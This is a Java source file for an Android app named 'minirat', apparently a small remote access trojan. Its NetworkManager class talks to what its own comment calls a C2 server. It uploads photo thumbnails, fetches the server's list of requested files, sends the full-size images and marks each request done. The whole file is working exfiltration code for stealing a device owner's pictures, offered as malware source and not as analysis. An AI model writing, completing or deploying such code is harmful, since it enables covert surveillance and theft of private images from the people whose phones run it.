package com.app.minirat;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

/**
 * Handles all HTTP communication with the C2 server.
 */
public class NetworkManager {
    private static final String TAG = "NetworkManager";
    private final String serverUrl;

    public NetworkManager(String serverUrl) {
        this.serverUrl = serverUrl;
    }

    /**
     * Checks if the server is reachable via a HEAD request.
     */
    public boolean isServerReachable() {
        try {
            URL url = new URL(serverUrl + "/api/thumbnails");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("HEAD");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            int code = conn.getResponseCode();
            conn.disconnect();
            return code >= 200 && code < 500;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Uploads a thumbnail to the server.
     * Returns true on success (2xx response).
     */
    public boolean uploadThumbnail(String fileName, String thumbnailBase64) {
        try {
            URL url = new URL(serverUrl + "/api/upload/thumbnail");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            JSONObject payload = new JSONObject();
            payload.put("filename", fileName);
            payload.put("thumbnail", thumbnailBase64);

            byte[] postData = payload.toString().getBytes("UTF-8");
            conn.setFixedLengthStreamingMode(postData.length);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
            dos.write(postData);
            dos.flush();
            dos.close();

            int code = conn.getResponseCode();
            conn.disconnect();

            boolean success = code >= 200 && code < 300;
            Log.d(TAG, "Thumbnail upload: " + code + " success=" + success);
            return success;

        } catch (Exception e) {
            Log.e(TAG, "Error uploading thumbnail", e);
            return false;
        }
    }

    /**
     * Uploads a full-size image to the server.
     * Returns true on success (2xx response).
     */
    public boolean uploadFullImage(String fileName, String imageBase64) {
        try {
            URL url = new URL(serverUrl + "/api/upload/fullsize");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(30000);

            JSONObject payload = new JSONObject();
            payload.put("filename", fileName);
            payload.put("image", imageBase64);

            byte[] postData = payload.toString().getBytes("UTF-8");
            conn.setFixedLengthStreamingMode(postData.length);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
            dos.write(postData);
            dos.flush();
            dos.close();

            int code = conn.getResponseCode();
            conn.disconnect();

            boolean success = code >= 200 && code < 300;
            Log.d(TAG, "Full image upload: " + code + " success=" + success);
            return success;

        } catch (Exception e) {
            Log.e(TAG, "Error uploading full image", e);
            return false;
        }
    }

    /**
     * Fetches the list of pending full-image requests from the server.
     * Returns a list of filenames the server wants full images for.
     */
    public ArrayList<String> getPendingRequests() {
        ArrayList<String> requests = new ArrayList<>();
        try {
            URL url = new URL(serverUrl + "/api/requests");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            if (conn.getResponseCode() == 200) {
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                reader.close();

                JSONObject json = new JSONObject(sb.toString());
                JSONArray arr = json.getJSONArray("requests");
                for (int i = 0; i < arr.length(); i++) {
                    requests.add(arr.getString(i));
                }
            }
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Error fetching requests", e);
        }
        return requests;
    }

    /**
     * Tells the server that a full-image request has been fulfilled.
     */
    public void markRequestFulfilled(String fileName) {
        try {
            URL url = new URL(serverUrl + "/api/request/" +
                    java.net.URLEncoder.encode(fileName, "UTF-8"));
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("DELETE");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Error marking request fulfilled", e);
        }
    }
}
